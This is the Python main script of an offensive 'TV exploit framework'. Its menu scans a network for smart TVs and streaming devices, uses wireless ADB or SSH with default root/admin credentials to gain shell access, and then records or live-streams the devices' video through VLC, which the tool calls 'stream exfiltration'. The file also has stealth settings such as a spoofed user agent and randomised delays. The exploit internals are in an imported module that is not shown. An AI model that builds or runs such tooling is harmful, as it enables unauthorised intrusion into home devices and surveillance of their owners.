import sys
from colorama import Fore, Style
from core import NetworkScanner, ExploitEngine, VLCStreamManager, StealthMechanisms, SessionManager

def print_menu():
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"{Fore.CYAN}|  TV EXPLOIT FRAMEWORK v2.0 (Advanced)")
    print(f"{Fore.CYAN}{'='*60}")
    print(f"{Fore.WHITE}1. Search Network (Stealth)")
    print(f"{Fore.WHITE}2. Select Target")
    print(f"{Fore.WHITE}3. Exploit Target (ADB/SSH)")
    print(f"{Fore.WHITE}4. Stream Exfiltration (VLC)")
    print(f"{Fore.WHITE}5. Session Management")
    print(f"{Fore.WHITE}6. Help / Instructions")
    print(f"{Fore.WHITE}0. Exit")
    print(f"{Fore.CYAN}{'='*60}\n")

def get_default_config():
    """CR-02 fix: Provide sensible defaults when config.yaml is missing."""
    return {
        'stealth': {
            'enabled': True,
            'delay_min': 1.5,
            'delay_max': 3.5,
            'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        },
        'scanner': {
            'interface': 'eth0',
            'timeout': 30,
            'scan_ports': '80,554,8080,7100,5555,22'
        },
        'exploits': {
            'adb': {'enabled': True, 'port': 5555},
            'ssh': {'enabled': True, 'port': 22, 'user': 'root', 'password': 'admin'}
        },
        'stream': {
            'vlc_path': 'vlc',
            'output_dir': './captures',
            'duration_seconds': 600
        },
        'session': {
            'log_file': './sessions.log'
        }
    }

def main():
    # Load Configuration
    import yaml
    try:
        with open('config.yaml', 'r') as f:
            config = yaml.safe_load(f)
            if config is None:
                config = {}
    except FileNotFoundError:
        print("Config file not found. Using defaults.")
        config = get_default_config()

    # CR-02 fix: Merge defaults so missing keys don't crash
    defaults = get_default_config()
    for key, val in defaults.items():
        if key not in config:
            config[key] = val
        elif isinstance(val, dict):
            for subkey, subval in val.items():
                if subkey not in config[key]:
                    config[key][subkey] = subval

    # Initialize Components
    scanner = NetworkScanner(config)
    exploit_engine = ExploitEngine(config)
    stream_manager = VLCStreamManager(config)
    stealth = StealthMechanisms(config)
    session_manager = SessionManager(config.get('session', {}).get('log_file', './sessions.log'))

    # Inject Session Manager into Exploit Engine
    exploit_engine.session_manager = session_manager

    # CR-35 fix: Store selected target for use across menu options
    selected_target = None

    current_targets = []

    # CR-36 fix: Add exception handling around menu loop
    while True:
        try:
            print_menu()
            choice = input(f"{Fore.WHITE}Select an option: {Fore.YELLOW}").strip()

            if choice == '1':
                target_range = input(f"{Fore.WHITE}Enter target subnet (e.g., 192.168.1.0/24): {Fore.YELLOW}").strip()
                print(f"{Fore.CYAN}{'='*60}")
                hosts = scanner.scan_network(target_range)
                current_targets = scanner.parse_results(hosts)
                scanner.display_results(current_targets)

            elif choice == '2':
                if not current_targets:
                    print(f"{Fore.RED}[ERROR] No targets found. Please scan first.")
                    continue
                print(f"{Fore.YELLOW}[TARGET] Select a device from the list above.")
                target_ip = input(f"{Fore.WHITE}Enter IP address: {Fore.YELLOW}").strip()

                target_found = False
                for ip, status, dev_type, vulns in current_targets:
                    if ip == target_ip:
                        target_found = True
                        selected_target = ip
                        print(f"{Fore.GREEN}[TARGET] Target selected: {ip} ({dev_type})")
                        break

                if not target_found:
                    print(f"{Fore.RED}[TARGET] Target not found or not vulnerable.")
                    continue

            elif choice == '3':
                # CR-35 fix: Use selected_target if available
                if selected_target:
                    use_selected = input(f"{Fore.WHITE}Use selected target {selected_target}? (y/n): {Fore.YELLOW}").strip().lower()
                    if use_selected == 'y':
                        target_ip = selected_target
                    else:
                        target_ip = input(f"{Fore.WHITE}Enter IP address: {Fore.YELLOW}").strip()
                else:
                    target_ip = input(f"{Fore.WHITE}Enter IP address: {Fore.YELLOW}").strip()

                print(f"{Fore.WHITE}Select exploit:")
                print(f"{Fore.CYAN}1. Wireless ADB (Roku, Fire TV, Android)")
                print(f"{Fore.CYAN}2. SSH (Root/Admin)")
                print(f"{Fore.CYAN}3. Integrated Chain (ADB + SSH)")
                e_type = input(f"{Fore.YELLOW}Choice: {Fore.YELLOW}").strip()

                params = {}
                if e_type == '1':
                    exploit_engine.execute_exploit(target_ip, 'adb_wireless', params)
                elif e_type == '2':
                    user = input(f"{Fore.WHITE}Username (default root): {Fore.YELLOW}").strip()
                    pass_in = input(f"{Fore.WHITE}Password (default admin): {Fore.YELLOW}").strip()
                    params = {'user': user or 'root', 'pass': pass_in or 'admin'}
                    exploit_engine.execute_exploit(target_ip, 'ssh_exploit', params)
                elif e_type == '3':
                    exploit_engine.integrate_exploits(target_ip)

            elif choice == '4':
                if selected_target:
                    use_selected = input(f"{Fore.WHITE}Use selected target {selected_target}? (y/n): {Fore.YELLOW}").strip().lower()
                    if use_selected == 'y':
                        target_ip = selected_target
                    else:
                        target_ip = input(f"{Fore.WHITE}Enter IP address: {Fore.YELLOW}").strip()
                else:
                    target_ip = input(f"{Fore.WHITE}Enter IP address: {Fore.YELLOW}").strip()

                print(f"{Fore.WHITE}Select Stream Mode:")
                print(f"{Fore.CYAN}1. Live Stream (Listen)")
                print(f"{Fore.CYAN}2. Record (1-10 mins)")
                stream_mode = input(f"{Fore.YELLOW}Choice: {Fore.YELLOW}").strip()

                if stream_mode == '1':
                    stream_manager.start_live_stream(target_ip)
                elif stream_mode == '2':
                    duration = input(f"{Fore.WHITE}Duration in minutes (1-10): {Fore.YELLOW}").strip()
                    try:
                        stream_manager.record_stream(target_ip, int(duration))
                    except ValueError:
                        print(f"{Fore.RED}[ERROR] Invalid duration.")

            elif choice == '5':
                session_manager.list_sessions()

            elif choice == '6':
                print(f"{Fore.CYAN}[HELP] Instructions:")
                print(f"{Fore.YELLOW}1. Scan the network to find TVs.")
                print(f"{Fore.YELLOW}2. Identify devices with vulnerable ports (ADB, SSH).")
                print(f"{Fore.YELLOW}3. Exploit using ADB or SSH to gain shell access.")
                print(f"{Fore.YELLOW}4. Use VLC to capture live broadcasts or recordings.")

            elif choice == '0':
                print(f"{Fore.GREEN}Exiting...")
                sys.exit(0)

        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}Interrupted. Exiting...")
            sys.exit(0)
        except Exception as e:
            print(f"{Fore.RED}[ERROR] {e}")
            continue

if __name__ == '__main__':
    main()
